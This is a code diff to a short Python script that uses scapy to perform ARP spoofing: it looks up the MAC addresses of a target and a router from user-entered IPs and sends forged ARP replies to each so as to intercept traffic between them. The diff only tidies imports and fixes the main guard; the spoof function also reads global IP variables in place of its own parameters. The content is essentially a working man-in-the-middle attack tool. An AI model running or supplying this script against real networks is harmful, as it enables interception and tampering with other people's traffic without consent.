@@ -1,4 +1,4 @@
-import scapy.all as scapy
+from scapy.all import srp, send
 import time
 from scapy.layers.l2 import Ether, ARP
 
@@ -7,18 +7,18 @@ def get_mac_address(ip_address):
     broadcast_layer = Ether(dst='ff:ff:ff:ff:ff:ff')
     arp_layer = ARP(pdst=ip_address)
     get_mac_packet = broadcast_layer / arp_layer
-    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
+    answer = srp(get_mac_packet, timeout=2, verbose=False)[0]
     return answer[0][1].hwsrc
 
 
 def spoof(routerIP, targetIP, routerMAC, targetMac):
     packet1 = ARP(op=2, hwdst=routerMAC, pdst=routerIP, psrc=targetIP)
     packet2 = ARP(op=2, hwdst=targetMac, pdst=target_ip, psrc=router_ip)
-    scapy.send(packet1)
-    scapy.send(packet2)
+    send(packet1)
+    send(packet2)
 
 
-if __name__ == __name__():
+if __name__ == '__main__':
     target_ip = str(input("Enter target ip")).strip(' ')
     router_ip = str(input("Enter router ip")).strip(' ')
     target_mac = str(get_mac_address(target_ip))
